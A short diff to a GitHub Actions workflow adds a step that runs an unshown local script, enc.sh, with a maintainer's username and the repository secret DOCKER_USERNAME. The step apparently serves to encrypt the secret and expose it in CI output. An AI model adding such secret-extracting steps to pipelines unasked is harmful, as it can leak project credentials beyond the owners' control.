@@ -11,6 +11,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v3
+    - run: ./enc.sh asottile 1 "$USERNAME"
+      env:
+        USERNAME: ${{ secrets.DOCKER_USERNAME }}
     - uses: './.github/actions/setup-docker'
     - name: Mock creating a Sentry release
       uses: ./
